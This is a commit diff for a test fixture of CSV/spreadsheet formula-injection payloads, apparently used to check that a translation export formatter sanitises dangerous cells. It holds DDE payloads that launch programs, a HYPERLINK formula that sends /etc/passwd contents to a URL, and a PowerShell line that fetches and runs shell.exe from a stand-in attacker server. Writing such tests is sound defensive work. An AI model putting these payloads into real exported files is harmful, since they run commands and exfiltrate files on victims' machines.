39caec8499ce1937b1729d81db475342ac434c64
RAHUL RATHORE <rahulrathore576@gmail.com>
2022-02-02 14:16:11 +0530

    fix: added more payload for csv injection

--- api/src/formatters/fixtures/index.ts
+++ api/src/formatters/fixtures/index.ts
@@ -29,16 +29,32 @@ export const simpleFormatFixture: IntermediateTranslationFormat = {
 export const riskyPayloads: IntermediateTranslationFormat = {
   translations: [
     {
-      term: `=cmd|' /C calc'!A0`,
-      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
-    },
-    {
       term: `=HYPERLINK('https://www.google.com', 'Google')`,
       translation: 'hyperlink function in excel',
     },
     {
-      term: `=cmd|' /C notepad'!'A1'`,
-      translation: 'to open the notepad application on excel/csv on the target machine (notepad automatic open command)',
+      term: `=HYPERLINK(CONCATENATE("http://0.0.0.0:80/123.txt?v="; ('file:///etc/passwd'#$passwd.A1)); "test-poc")`,
+      translation: 'hyperlink concatenate function in csv',
     },
+    {
+      term: `=cmd|' /C calc'!A0`,
+      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
+    },
+    {
+      term: `@SUM(1+9)*cmd|' /C calc'!A0`,
+      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
+    },
+    {
+      term: `=10+20+cmd|' /C calc'!A0`,
+      translation: 'to open the calculator application on the target machine (calculator automatic open command)',
+    },
+    {
+      term: `=cmd|' /C notepad'!'A1'`,
+      translation: 'to open the calculator application on the target machine (notepad automatic open command)',
+    },
+    {
+      term: `=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0`,
+      translation: 'wget attacker server shell',
+    }
   ],
 };
